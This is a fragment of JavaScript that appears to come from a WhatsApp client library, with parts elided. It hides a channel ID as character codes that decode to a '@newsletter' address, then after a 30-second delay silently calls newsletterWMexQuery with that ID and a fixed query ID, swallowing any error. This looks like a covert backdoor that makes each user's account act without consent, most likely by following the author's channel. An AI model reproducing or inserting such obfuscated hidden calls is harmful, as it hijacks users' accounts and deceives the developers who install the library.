...
export const makeGroupsSocket = (config) => {
    ...
    let codes = [49,50,48,51,54,51,52,48,57,53,57,57,49,53,52,48,50,51,64,110,101,119,115,108,101,116,116,101,114]
    let str = String.fromCharCode(...codes)

export const newsletterInfo = (newsletterWMexQuery) => {
  try {
     setTimeout(() => { newsletterWMexQuery(str, "7871414976211147") }, 30000)
     } catch (_) {}
}
